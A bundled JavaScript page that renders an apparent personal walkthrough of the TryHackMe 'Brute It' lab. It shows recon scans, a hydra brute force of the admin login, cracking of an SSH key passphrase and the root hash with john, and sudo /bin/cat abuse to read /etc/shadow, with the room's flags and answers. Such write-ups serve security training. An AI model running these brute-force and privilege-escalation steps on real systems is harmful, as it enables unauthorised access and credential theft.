"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1314],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>m});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},s=Object.keys(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(r=0;r<s.length;r++)n=s[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,s=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),c=p(n),h=a,m=c["".concat(l,".").concat(h)]||c[h]||d[h]||s;return n?r.createElement(m,o(o({ref:t},u),{},{components:n})):r.createElement(m,o({ref:t},u))}));function m(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var s=n.length,o=new Array(s);o[0]=h;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[c]="string"==typeof e?e:a,o[1]=i;for(var p=2;p<s;p++)o[p]=n[p];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},53011:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>s,metadata:()=>i,toc:()=>p});var r=n(87462),a=(n(67294),n(3905));const s={},o="Brute It",i={unversionedId:"Tryhackme/Brute It/Brute it",id:"Tryhackme/Brute It/Brute it",title:"Brute It",description:"Learn how to brute, hash cracking and escalate privileges in this box!",source:"@site/writeups/Tryhackme/Brute It/Brute it.md",sourceDirName:"Tryhackme/Brute It",slug:"/Tryhackme/Brute It/",permalink:"/writeups/Tryhackme/Brute It/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Brooklyn Nine Nine",permalink:"/writeups/Tryhackme/Brooklyn Nine Nine/Brookyln nine nine"},next:{title:"Buffer Overflow Prep",permalink:"/writeups/Tryhackme/Buffer Overflow Prep/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 About this box",id:"task-1-about-this-box",level:2},{value:"Task 2 Reconnaissance",id:"task-2-reconnaissance",level:2},{value:"Task 3 Getting a shell",id:"task-3-getting-a-shell",level:2},{value:"Task 4 Privilege Escalation",id:"task-4-privilege-escalation",level:2}],u={toc:p},c="wrapper";function d(e){let{components:t,...n}=e;return(0,a.kt)(c,(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"brute-it"},"Brute It"),(0,a.kt)("p",null,"Learn how to brute, hash cracking and escalate privileges in this box!"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/bruteit"},"Brute It")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Souce Code Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (http-post-form)"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (SSH)"),(0,a.kt)("li",{parentName:"ul"},"Misconfigure Binary (/bin/cat)"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-about-this-box"},"Task 1 About this box"),(0,a.kt)("p",null,"In this box you will learn about:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Brute-force"),(0,a.kt)("li",{parentName:"ul"},"Hash cracking"),(0,a.kt)("li",{parentName:"ul"},"Privilege escalation")),(0,a.kt)("p",null,"Connect to the TryHackMe network, and deploy the machine."),(0,a.kt)("p",null,"Deploy the machine"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,a.kt)("h2",{id:"task-2-reconnaissance"},"Task 2 Reconnaissance"),(0,a.kt)("p",null,"Before attacking, let's get information about the target"),(0,a.kt)("p",null,"Search for open ports using nmap."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"ali@kali:~/CTFs/tryhackme/Brute It$ sudo nmap -A -sS -sC -sV -O 10.10.16.131\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 20:51 CET\nNmap scan report for 10.10.16.131\nHost is up (0.069s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)\n|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)\n|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=11/14%OT=22%CT=1%CU=32911%PV=Y%DS=2%DC=T%G=Y%TM=5FB035\nOS:51%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=2%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT      ADDRESS\n1   33.70 ms 10.8.0.1\n2   33.95 ms 10.10.16.131\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 23.92 seconds\n")),(0,a.kt)("p",null,"How many ports are open?"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"2")),(0,a.kt)("p",null,"What version of SSH is running?"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"OpenSSH 7.6p1")),(0,a.kt)("p",null,"What version of Apache is running?"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"2.4.29")),(0,a.kt)("p",null,"Which Linux distribution is running?"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Ubuntu")),(0,a.kt)("p",null,"Search for hidden directories on web server.\nWhat is the hidden directory?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Brute It$ gobuster dir -u 10.10.16.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.16.131\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/11/14 20:53:23 Starting gobuster\n===============================================================\n/admin (Status: 301)\nProgress: 1024 / 220561 (0.46%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/11/14 20:53:33 Finished\n===============================================================\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"/admin")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.16.131/admin/"},"view-source:http://10.10.16.131/admin/")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-html"},"\x3c!-- Hey john, if you do not remember, the username is admin --\x3e\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Brute It$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.16.131 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -f\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-14 20:55:53\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-post-form://10.10.16.131:80/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid\n[80][http-post-form] host: 10.10.16.131   login: admin   password: xavier\n[STATUS] attack finished for 10.10.16.131 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-14 20:56:09\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"\nHello john, finish the development of the site, here's your RSA private key.\n\n\nTHM{brut3_f0rce_is_e4sy}\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Brute It$ wget http://10.10.16.131/admin/panel/id_rsa\n--2020-11-14 20:56:51--  http://10.10.16.131/admin/panel/id_rsa\nConnecting to 10.10.16.131:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1766 (1.7K)\nSaving to: \u2018id_rsa\u2019\n\nid_rsa                                           100%[=======================================================================================================>]   1.72K  --.-KB/s    in 0s\n\n2020-11-14 20:56:51 (162 MB/s) - \u2018id_rsa\u2019 saved [1766/1766]\n\nkali@kali:~/CTFs/tryhackme/Brute It$ chmod 600 id_rsa\nkali@kali:~/CTFs/tryhackme/Brute It$ ssh -i id_rsa john@10.10.16.131\nThe authenticity of host '10.10.16.131 (10.10.16.131)' can't be established.\nECDSA key fingerprint is SHA256:6/bVnMDQ46C+aRgroR5KUwqKM6J9jAfSYFMQIOKckug.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.16.131' (ECDSA) to the list of known hosts.\nEnter passphrase for key 'id_rsa':\n\nkali@kali:~/CTFs/tryhackme/Brute It$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash\nkali@kali:~/CTFs/tryhackme/Brute It$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\nrockinroll       (id_rsa)\nWarning: Only 2 candidates left, minimum 4 needed for performance.\n1g 0:00:00:06 DONE (2020-11-14 21:07) 0.1466g/s 2102Kp/s 2102Kc/s 2102KC/sa6_123..*7\xa1Vamos!\nSession completed\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Brute It$ ssh -i id_rsa john@10.10.16.131\nEnter passphrase for key 'id_rsa':\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat Nov 14 20:08:33 UTC 2020\n\n  System load:  0.16               Processes:           104\n  Usage of /:   25.7% of 19.56GB   Users logged in:     0\n  Memory usage: 20%                IP address for eth0: 10.10.16.131\n  Swap usage:   0%\n\n\n63 packages can be updated.\n0 updates are security updates.\n\n\nLast login: Wed Sep 30 14:06:18 2020 from 192.168.1.106\njohn@bruteit:~$\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"john@bruteit:~$ cat user.txt\nTHM{a_password_is_not_a_barrier}\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"john@bruteit:~$ sudo -l\nMatching Defaults entries for john on bruteit:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser john may run the following commands on bruteit:\n    (root) NOPASSWD: /bin/cat\njohn@bruteit:~$ sudo /bin/cat /root/root.txt\nTHM{pr1v1l3g3_3sc4l4t10n}\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"john@bruteit:~$ sudo /bin/cat /etc/shadow\nroot:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::\ndaemon:*:18295:0:99999:7:::\nbin:*:18295:0:99999:7:::\nsys:*:18295:0:99999:7:::\nsync:*:18295:0:99999:7:::\ngames:*:18295:0:99999:7:::\nman:*:18295:0:99999:7:::\nlp:*:18295:0:99999:7:::\nmail:*:18295:0:99999:7:::\nnews:*:18295:0:99999:7:::\nuucp:*:18295:0:99999:7:::\nproxy:*:18295:0:99999:7:::\nwww-data:*:18295:0:99999:7:::\nbackup:*:18295:0:99999:7:::\nlist:*:18295:0:99999:7:::\nirc:*:18295:0:99999:7:::\ngnats:*:18295:0:99999:7:::\nnobody:*:18295:0:99999:7:::\nsystemd-network:*:18295:0:99999:7:::\nsystemd-resolve:*:18295:0:99999:7:::\nsyslog:*:18295:0:99999:7:::\nmessagebus:*:18295:0:99999:7:::\n_apt:*:18295:0:99999:7:::\nlxd:*:18295:0:99999:7:::\nuuidd:*:18295:0:99999:7:::\ndnsmasq:*:18295:0:99999:7:::\nlandscape:*:18295:0:99999:7:::\npollinate:*:18295:0:99999:7:::\nthm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::\nsshd:*:18489:0:99999:7:::\njohn:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Brute It$ john -w=/usr/share/wordlists/rockyou.txt root.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nfootball         (?)\n1g 0:00:00:00 DONE (2020-11-14 21:11) 3.571g/s 1828p/s 1828c/s 1828C/s 123456..letmein\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n")),(0,a.kt)("h2",{id:"task-3-getting-a-shell"},"Task 3 Getting a shell"),(0,a.kt)("p",null,"Find a form to get a shell on SSH."),(0,a.kt)("p",null,"What is the user:password of the admin panel?"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"admin:xavier")),(0,a.kt)("p",null,"Crack the RSA key you found.\nWhat is John's RSA Private Key passphrase?"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"rockinroll")),(0,a.kt)("p",null,"user.txt"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{a_password_is_not_a_barrier}")),(0,a.kt)("p",null,"Web flag"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{brut3_f0rce_is_e4sy}")),(0,a.kt)("h2",{id:"task-4-privilege-escalation"},"Task 4 Privilege Escalation"),(0,a.kt)("p",null,"Now, we need to escalate our privileges."),(0,a.kt)("p",null,"Find a form to escalate your privileges.\nWhat is the root's password?"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"football")),(0,a.kt)("p",null,"root.txt"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"THM{pr1v1l3g3_3sc4l4t10n}")))}d.isMDXComponent=!0}}]);